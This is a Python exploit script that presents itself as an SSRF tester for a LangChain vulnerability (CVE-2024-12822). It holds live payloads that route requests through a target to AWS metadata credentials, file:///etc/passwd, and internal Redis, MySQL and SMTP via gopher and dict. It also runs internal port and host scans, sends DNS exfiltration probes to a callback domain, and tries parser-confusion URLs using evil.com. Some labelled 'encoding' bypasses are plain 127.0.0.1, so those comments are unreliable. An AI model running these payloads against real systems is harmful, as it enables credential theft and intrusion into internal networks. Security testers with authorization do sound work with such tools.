#!/usr/bin/env python3
"""
Multi-Vector SSRF Tester for CVE-2024-12822

Advanced SSRF testing framework with:
- Blind SSRF detection via timing attacks
- DNS exfiltration
- Protocol smuggling
- Bypass techniques (URL encoding, redirects, etc.)
- Network pivoting capabilities

Author: Tsunami Community
License: Apache 2.0
"""

import argparse
import time
import socket
import hashlib
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, urlparse
import requests
from colorama import Fore, Style, init

init(autoreset=True)


class MultiVectorSSRFTester:
    """Advanced multi-vector SSRF testing framework."""

    # SSRF bypass techniques
    BYPASS_PAYLOADS = [
        # IP encoding variations
        ("Decimal IP", "http://2130706433/"),  # 127.0.0.1 in decimal
        ("Octal IP", "http://0177.0.0.1/"),
        ("Hex IP", "http://0x7f.0x0.0x0.0x1/"),
        ("Mixed encoding", "http://0x7f.0.0.1/"),
        
        # URL tricks
        ("@ symbol trick", "http://evil.com@169.254.169.254/"),
        ("# fragment trick", "http://169.254.169.254#@evil.com/"),
        
        # DNS tricks
        ("Localhost variations", "http://localhost.evil.com/"),
        ("127.0.0.1.nip.io", "http://127.0.0.1.nip.io/"),
        
        # IPv6
        ("IPv6 localhost", "http://[::1]/"),
        ("IPv6 AWS", "http://[fd00:ec2::254]/"),
        
        # Protocol smuggling
        ("Dict protocol", "dict://127.0.0.1:6379/info"),
        ("Gopher protocol", "gopher://127.0.0.1:6379/_INFO"),
        ("File protocol", "file:///etc/passwd"),
        
        # URL encoding bypasses
        ("Double encoding", "http://127.0.0.1/"),
        ("Unicode encoding", "http://127.0.0.1/"),
        
        # Redirect-based
        ("HTTP redirect", "http://redirect-to-metadata.com/"),
    ]

    # Common internal services to scan
    INTERNAL_SERVICES = [
        ("Redis", 6379),
        ("MySQL", 3306),
        ("PostgreSQL", 5432),
        ("MongoDB", 27017),
        ("Memcached", 11211),
        ("Elasticsearch", 9200),
        ("Docker API", 2375),
        ("Kubernetes API", 6443),
        ("Consul", 8500),
        ("Etcd", 2379),
    ]

    def __init__(self, target_url: str, endpoint: str, timeout: int = 10):
        """Initialize the tester."""
        self.target_url = target_url.rstrip('/')
        self.endpoint = endpoint
        self.timeout = timeout
        self.session = requests.Session()
        self.results = {
            "bypass_successful": [],
            "open_services": [],
            "timing_anomalies": [],
            "dns_leaks": [],
        }

    def print_banner(self):
        """Print banner."""
        banner = f"""
{Fore.MAGENTA}╔═══════════════════════════════════════════════════════════════╗
║                                                               ║
║   Multi-Vector SSRF Tester                                   ║
║   Advanced Bypass & Detection Techniques                     ║
║                                                               ║
║   CVE-2024-12822 | LangChain SSRF                            ║
║                                                               ║
╚═══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
"""
        print(banner)

    def ssrf_request(
        self, 
        target: str, 
        measure_time: bool = False
    ) -> Tuple[Optional[str], float]:
        """Make SSRF request and optionally measure response time."""
        url = f"{self.target_url}{self.endpoint}"
        
        start_time = time.time()
        response_text = None
        
        try:
            response = self.session.post(
                url,
                json={"url": target},
                timeout=self.timeout
            )
            response_text = response.text
        except Exception as e:
            pass
        
        elapsed = time.time() - start_time
        
        return response_text, elapsed

    def test_bypass_techniques(self):
        """Test various SSRF bypass techniques."""
        print(f"\n{Fore.CYAN}[*] Testing bypass techniques...{Style.RESET_ALL}\n")
        
        # Test AWS metadata with various bypasses
        aws_metadata = "http://169.254.169.254/latest/meta-data/"
        
        for bypass_name, bypass_url in self.BYPASS_PAYLOADS:
            print(f"{Fore.YELLOW}Testing: {bypass_name:<25}{Style.RESET_ALL}", end=" ")
            
            # Replace the target in generic bypass URLs
            if "127.0.0.1" in bypass_url or "localhost" in bypass_url:
                test_url = bypass_url
            else:
                test_url = bypass_url
            
            response, elapsed = self.ssrf_request(test_url)
            
            if response and len(response) > 0:
                # Check if we got meaningful data back
                if any(keyword in response for keyword in [
                    "ami-", "instance", "iam", "security-credentials"
                ]):
                    print(f"{Fore.GREEN}✓ SUCCESS{Style.RESET_ALL}")
                    self.results["bypass_successful"].append({
                        "technique": bypass_name,
                        "url": test_url,
                        "response_preview": response[:100]
                    })
                else:
                    print(f"{Fore.BLUE}Response received{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ No response{Style.RESET_ALL}")

    def timing_attack_scan(self, target_ip: str = "127.0.0.1"):
        """Perform timing-based blind SSRF detection."""
        print(f"\n{Fore.CYAN}[*] Running timing-based blind SSRF detection...{Style.RESET_ALL}\n")
        
        # Baseline: request to definitely closed port
        baseline_url = f"http://{target_ip}:99999/"
        _, baseline_time = self.ssrf_request(baseline_url)
        
        print(f"Baseline time (closed port): {baseline_time:.2f}s")
        
        for service_name, port in self.INTERNAL_SERVICES:
            test_url = f"http://{target_ip}:{port}/"
            
            print(f"{Fore.YELLOW}Testing {service_name:<15} (port {port:>5}):{Style.RESET_ALL}", end=" ")
            
            response, elapsed = self.ssrf_request(test_url, measure_time=True)
            
            # Timing-based detection
            time_diff = abs(elapsed - baseline_time)
            
            if time_diff > 1.0:  # Significant timing difference
                status = f"{Fore.GREEN}LIKELY OPEN (Δt={time_diff:.2f}s){Style.RESET_ALL}"
                self.results["open_services"].append({
                    "service": service_name,
                    "port": port,
                    "timing_diff": time_diff
                })
            elif response and len(response) > 10:
                status = f"{Fore.GREEN}OPEN (response received){Style.RESET_ALL}"
                self.results["open_services"].append({
                    "service": service_name,
                    "port": port,
                    "response": True
                })
            else:
                status = f"{Fore.RED}Closed/Filtered{Style.RESET_ALL}"
            
            print(status)

    def dns_exfiltration_test(self, callback_domain: Optional[str] = None):
        """Test DNS exfiltration via SSRF."""
        print(f"\n{Fore.CYAN}[*] Testing DNS exfiltration capabilities...{Style.RESET_ALL}\n")
        
        if not callback_domain:
            print(f"{Fore.YELLOW}[!] No callback domain provided. Skipping DNS exfiltration test.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Use --dns-callback <your-domain> to enable this test.{Style.RESET_ALL}")
            return
        
        # Generate unique identifier
        unique_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        # Test various DNS exfiltration techniques
        tests = [
            ("Direct DNS", f"http://{unique_id}.{callback_domain}/"),
            ("Subdomain exfil", f"http://test.{unique_id}.{callback_domain}/"),
            ("FTP DNS", f"ftp://{unique_id}.{callback_domain}/"),
        ]
        
        print(f"{Fore.YELLOW}Unique ID for this test: {unique_id}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Monitor DNS queries to: *.{callback_domain}{Style.RESET_ALL}\n")
        
        for test_name, test_url in tests:
            print(f"{Fore.YELLOW}Testing: {test_name:<20}{Style.RESET_ALL}")
            self.ssrf_request(test_url)
            time.sleep(1)
        
        print(f"\n{Fore.GREEN}[+] DNS exfiltration tests sent.{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[+] Check your DNS logs for queries containing: {unique_id}{Style.RESET_ALL}")

    def protocol_smuggling_test(self):
        """Test various protocol smuggling techniques."""
        print(f"\n{Fore.CYAN}[*] Testing protocol smuggling...{Style.RESET_ALL}\n")
        
        # Redis INFO command via Gopher
        redis_payload = "gopher://127.0.0.1:6379/_INFO"
        
        # Test payloads
        payloads = [
            ("Redis INFO (Gopher)", redis_payload),
            ("Redis SET (Gopher)", "gopher://127.0.0.1:6379/_SET%20test%20value"),
            ("MySQL (Gopher)", "gopher://127.0.0.1:3306/_test"),
            ("SMTP (Gopher)", "gopher://127.0.0.1:25/_HELO%20test"),
            ("Dict protocol", "dict://127.0.0.1:6379/info"),
            ("LDAP", "ldap://127.0.0.1:389/"),
        ]
        
        for payload_name, payload_url in payloads:
            print(f"{Fore.YELLOW}Testing: {payload_name:<25}{Style.RESET_ALL}", end=" ")
            
            response, _ = self.ssrf_request(payload_url)
            
            if response:
                # Check for protocol-specific responses
                if any(keyword in response.lower() for keyword in [
                    "redis", "mysql", "smtp", "ldap", "version", "server"
                ]):
                    print(f"{Fore.GREEN}✓ Potential protocol response{Style.RESET_ALL}")
                else:
                    print(f"{Fore.BLUE}Response received{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ No response{Style.RESET_ALL}")

    def url_parser_confusion(self):
        """Test URL parser confusion attacks."""
        print(f"\n{Fore.CYAN}[*] Testing URL parser confusion...{Style.RESET_ALL}\n")
        
        target = "169.254.169.254"
        
        confusion_payloads = [
            ("Backslash confusion", f"http://evil.com\\@{target}/"),
            ("Multiple @ symbols", f"http://user:pass@evil.com@{target}/"),
            ("Tab character", f"http://evil.com\t@{target}/"),
            ("Newline injection", f"http://evil.com\n@{target}/"),
            ("CRLF injection", f"http://evil.com\r\n@{target}/"),
            ("Null byte", f"http://evil.com\x00@{target}/"),
        ]
        
        for payload_name, payload_url in confusion_payloads:
            print(f"{Fore.YELLOW}Testing: {payload_name:<25}{Style.RESET_ALL}", end=" ")
            
            response, _ = self.ssrf_request(payload_url)
            
            if response and len(response) > 10:
                print(f"{Fore.GREEN}✓ Potential bypass{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Blocked/No response{Style.RESET_ALL}")

    def redirect_based_bypass(self, redirect_url: Optional[str] = None):
        """Test redirect-based SSRF bypass."""
        print(f"\n{Fore.CYAN}[*] Testing redirect-based bypass...{Style.RESET_ALL}\n")
        
        if not redirect_url:
            print(f"{Fore.YELLOW}[!] No redirect URL provided.{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Set up a server that redirects to 169.254.169.254{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] Use --redirect-url <your-redirect-server>{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}Testing redirect from: {redirect_url}{Style.RESET_ALL}")
        
        response, _ = self.ssrf_request(redirect_url)
        
        if response:
            if "ami-" in response or "instance" in response:
                print(f"{Fore.GREEN}[+] ✓ Redirect bypass successful!{Style.RESET_ALL}")
                print(f"{Fore.GREEN}[+] Retrieved metadata via redirect{Style.RESET_ALL}")
            else:
                print(f"{Fore.BLUE}[*] Got response but doesn't look like metadata{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[-] Redirect bypass failed{Style.RESET_ALL}")

    def localhost_variation_test(self):
        """Test localhost variations."""
        print(f"\n{Fore.CYAN}[*] Testing localhost variations...{Style.RESET_ALL}\n")
        
        localhost_variations = [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://127.1/",
            "http://127.0.1/",
            "http://0.0.0.0/",
            "http://[::1]/",
            "http://[::ffff:127.0.0.1]/",
            "http://localtest.me/",
            "http://127.0.0.1.nip.io/",
            "http://127.0.0.1.xip.io/",
        ]
        
        for variant in localhost_variations:
            print(f"{Fore.YELLOW}Testing: {variant:<35}{Style.RESET_ALL}", end=" ")
            
            response, _ = self.ssrf_request(variant)
            
            if response and len(response) > 10:
                print(f"{Fore.GREEN}✓ Accessible{Style.RESET_ALL}")
            else:
                print(f"{Fore.RED}✗ Blocked{Style.RESET_ALL}")

    def network_pivoting_scan(self, network: str = "192.168.1"):
        """Scan internal network for live hosts."""
        print(f"\n{Fore.CYAN}[*] Network pivoting - scanning {network}.0/24...{Style.RESET_ALL}\n")
        print(f"{Fore.YELLOW}[!] This may take a while...{Style.RESET_ALL}\n")
        
        live_hosts = []
        
        # Scan first 10 IPs as example (full scan would take too long)
        for i in range(1, 11):
            ip = f"{network}.{i}"
            test_url = f"http://{ip}/"
            
            print(f"{Fore.YELLOW}Scanning {ip:<15}{Style.RESET_ALL}", end=" ")
            
            response, elapsed = self.ssrf_request(test_url, measure_time=True)
            
            # Live host detection based on response or timing
            if response or elapsed < 2:
                print(f"{Fore.GREEN}✓ Host alive{Style.RESET_ALL}")
                live_hosts.append(ip)
            else:
                print(f"{Fore.RED}✗ No response{Style.RESET_ALL}")
        
        if live_hosts:
            print(f"\n{Fore.GREEN}[+] Live hosts found: {', '.join(live_hosts)}{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[-] No live hosts found in range{Style.RESET_ALL}")

    def run_all_tests(
        self,
        dns_callback: Optional[str] = None,
        redirect_url: Optional[str] = None,
        network: str = "192.168.1"
    ):
        """Run all SSRF tests."""
        self.print_banner()
        
        print(f"{Fore.YELLOW}Target: {self.target_url}{self.endpoint}{Style.RESET_ALL}\n")
        
        # Run all test modules
        self.test_bypass_techniques()
        self.timing_attack_scan()
        self.protocol_smuggling_test()
        self.url_parser_confusion()
        self.localhost_variation_test()
        
        if dns_callback:
            self.dns_exfiltration_test(dns_callback)
        
        if redirect_url:
            self.redirect_based_bypass(redirect_url)
        
        # Optional: network pivoting (can be slow)
        # self.network_pivoting_scan(network)
        
        # Print summary
        self.print_summary()

    def print_summary(self):
        """Print test summary."""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}TEST SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        if self.results["bypass_successful"]:
            print(f"{Fore.GREEN}[+] Successful bypass techniques:{Style.RESET_ALL}")
            for bypass in self.results["bypass_successful"]:
                print(f"    - {bypass['technique']}")
        
        if self.results["open_services"]:
            print(f"\n{Fore.GREEN}[+] Open internal services:{Style.RESET_ALL}")
            for service in self.results["open_services"]:
                print(f"    - {service['service']} (port {service['port']})")
        
        if not self.results["bypass_successful"] and not self.results["open_services"]:
            print(f"{Fore.YELLOW}[!] No successful bypasses or open services detected{Style.RESET_ALL}")
            print(f"{Fore.YELLOW}[!] The application may have SSRF protections in place{Style.RESET_ALL}")


def main():
    """Main entry point."""
    parser = argparse.ArgumentParser(
        description="Multi-Vector SSRF Tester for CVE-2024-12822",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-e', '--endpoint', required=True, help='Vulnerable endpoint')
    parser.add_argument('-t', '--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--dns-callback', help='DNS callback domain for exfiltration tests')
    parser.add_argument('--redirect-url', help='Redirect server URL for bypass tests')
    parser.add_argument('--network', default='192.168.1', help='Internal network to scan')
    parser.add_argument('--bypass-only', action='store_true', help='Test bypass techniques only')
    parser.add_argument('--timing-only', action='store_true', help='Run timing attack scan only')
    
    args = parser.parse_args()
    
    tester = MultiVectorSSRFTester(args.url, args.endpoint, args.timeout)
    
    if args.bypass_only:
        tester.print_banner()
        tester.test_bypass_techniques()
    elif args.timing_only:
        tester.print_banner()
        tester.timing_attack_scan()
    else:
        tester.run_all_tests(
            dns_callback=args.dns_callback,
            redirect_url=args.redirect_url,
            network=args.network
        )


if __name__ == "__main__":
    main()
